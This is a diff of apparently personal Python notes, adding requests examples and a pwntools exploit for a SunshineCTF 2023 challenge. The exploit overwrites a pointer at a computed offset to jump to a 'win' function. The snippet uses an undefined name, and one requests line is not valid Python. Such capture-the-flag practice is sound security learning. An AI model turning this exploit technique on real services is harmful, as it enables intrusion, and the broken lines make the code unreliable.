@@ -7,12 +7,6 @@ bytes bytes_to_long() long_to_bytes()
 '''
 
 #REQUESTS
-
-#PWNTOOLS
-'''
-xor(a,b)
-'''
-#test
 '''
 s = requests.Session()
 
@@ -21,6 +15,39 @@ r = s.get('https://httpbin.org/cookies')
 
 print(r.text)
 # '{"cookies": {"sessioncookie": "123456789"}}'
+
+x = requests.get('https://w3schools.com')
+print(x.status_code)
+
+url = 'https://www.w3schools.com/python/demopage.php'
+myobj = {'somekey': 'somevalue'}
+
+x = requests.post(url, json = myobj)
+requests.post(url, data={key: value}, json={key: value}, args)
+
+'''
+#PWNTOOLS
+'''
+xor(a,b)
+from pwn import *
+
+r = remote('chal.2023.sunshinectf.games', 23004)
+
+r.recvuntil(b'At ')
+buf = int(r.recvline(), 16)
+print(buf)
+fruits = 0x405080
+printf_sym = 0x4050d0
+offset = (printf_sym - fruits) // 8
+
+win = 0x4011b9
+offset2 = (printf_plt - fruits) // 8
+r.sendline(str(offset).encode())
+r.sendline(b'\x06' + b'\x00' * 7)
+r.sendline(str(offset2).encode())
+r.sendline(win.to_bytes(8, 'little'))
+
+r.interactive()
 '''
 
 #volatility
